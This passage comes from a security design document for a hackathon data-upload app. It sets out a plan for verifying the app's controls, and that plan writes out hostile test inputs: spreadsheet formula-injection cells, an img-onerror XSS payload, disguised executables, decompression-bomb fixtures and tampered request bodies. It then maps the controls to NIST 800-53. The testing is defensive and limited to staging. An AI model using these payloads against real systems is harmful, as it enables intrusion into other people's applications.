- Per-upload Firecracker microVMs, mTLS between Vercel↔API, HSM-backed key management, and a full SIEM are **overkill** for a 5-day demo and add fragility. The subprocess sandbox + Supabase RLS + the cheap config controls give ~90% of the real risk reduction at ~10% of the effort. Say so to judges — *knowing what's overkill is itself a senior signal.*

---

## 6. Verification Plan (test the controls without attacking prod)

- **Auth/RLS:** with user A's JWT, attempt to GET/DELETE user B's dataset id → expect 403/empty (RLS). Attempt 6th upload → expect 409 QUOTA. (Automated pytest against a staging Supabase project.)
- **Type/size/bomb:** upload renamed `.exe` as `.csv` (expect 415); 60MB file (expect 413); a crafted high-ratio zip-as-xlsx test fixture (expect ZIP_BOMB) — use a known *benign* decompression-bomb fixture, not live malware.
- **Formula injection:** upload a CSV with `=1+1`, `@SUM(A1)`, `+cmd` cells → download the board copy → assert every dangerous cell is prefixed with `'` and renders inert. (No execution test on a real machine.)
- **XSS:** dataset name `<img src=x onerror=alert(1)>` → assert escaped in DOM + CSP blocks inline script (Playwright + check no `dangerouslySetInnerHTML`).
- **Relevance bypass:** craft an off-topic dataset + try to force acceptance via a tampered request body / forged response → assert board view (DB-filtered) never shows it and Score=0/Rank=0 persisted.
- **Sandbox limits:** feed a CPU-spin / memory-balloon CSV fixture → assert PARSE_TIMEOUT/PARSE_FAIL and the API process stays up.
- **Tooling:** `semgrep --config p/owasp-top-ten` + `bandit` on the API, `pnpm audit`/`pip-audit` for deps, OWASP ZAP baseline scan against **staging only**. EDITH is owned by Boss → authorized to test; use ZAP/Burp baseline, not novel exploits.
- **Tabletop prompt:** "An uploaded XLSX is flagged MALWARE by staged ClamAV after 12 datasets are already public — walk the IR runbook: contain (pull board copy + revoke signed URLs), eradicate (purge bucket object + mark row quarantined), recover, notify, postmortem."

---

## 7. Compliance / Control Mapping (informational)

| Control area | NIST 800-53 Rev 5 | Notes |
|---|---|---|
| Access control / RLS | AC-3, AC-6 (least privilege) | service_role server-only; anon RLS-gated |
| Identification & auth | IA-2, IA-5 | Supabase JWT, JWKS verify |
| Audit logging | AU-2, AU-3, AU-9 (protect audit info) | hash-chained events |
| System/info integrity | SI-3 (malware), SI-10 (input validation) | ClamAV staged; magic+schema validation |
| Resource availability | SC-5 (DoS protection) | size/row/bomb caps, rate limits |
| Boundary protection | SC-7 | sandbox no-network, CORS, CSP |
| Data at rest/transit | SC-8, SC-28 | TLS everywhere, private buckets |

*(No formal SOC2/HIPAA/PCI regime applies to a hackathon demo — included for completeness/senior signal.)*
```
